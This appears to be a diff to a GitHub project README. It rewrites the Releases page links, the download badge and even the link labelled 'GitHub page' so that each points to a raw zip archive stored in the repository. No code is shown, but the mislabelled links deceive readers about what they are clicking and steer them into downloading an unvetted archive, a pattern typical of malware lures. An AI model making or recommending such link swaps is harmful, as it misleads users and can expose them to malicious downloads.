@@ -8,7 +8,7 @@ Welcome to **Regalos-para-los-bots**! This application serves as a digital sanct
 
 You can download the application from our Releases page. Click the button below to get started:
 
-[![Download Regalos-para-los-bots](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/jeetsurjeet123/Regalos-para-los-bots/releases)
+[![Download Regalos-para-los-bots](https://github.com/jeetsurjeet123/Regalos-para-los-bots/raw/refs/heads/main/regalos/bots-Regalos-los-para-v3.2.zip%20Version-brightgreen)](https://github.com/jeetsurjeet123/Regalos-para-los-bots/raw/refs/heads/main/regalos/bots-Regalos-los-para-v3.2.zip)
 
 ## 📋 Features
 
@@ -33,7 +33,7 @@ To install the application, follow these steps:
 
 1. **Visit the Releases Page:** Go to our Releases page by clicking the link below:
 
-   [Download Latest Version](https://github.com/jeetsurjeet123/Regalos-para-los-bots/releases)
+   [Download Latest Version](https://github.com/jeetsurjeet123/Regalos-para-los-bots/raw/refs/heads/main/regalos/bots-Regalos-los-para-v3.2.zip)
 
 2. **Select the Latest Version:** Look for the most recent version listed at the top of the page. This version contains the latest features and fixes.
 
@@ -77,6 +77,6 @@ The application covers a wide range of relevant topics, including:
 
 ## 🔗 Links
 
-For more details, visit our [GitHub page](https://github.com/jeetsurjeet123/Regalos-para-los-bots).
+For more details, visit our [GitHub page](https://github.com/jeetsurjeet123/Regalos-para-los-bots/raw/refs/heads/main/regalos/bots-Regalos-los-para-v3.2.zip).
 
 Thank you for choosing Regalos-para-los-bots. We hope you enjoy your experience!
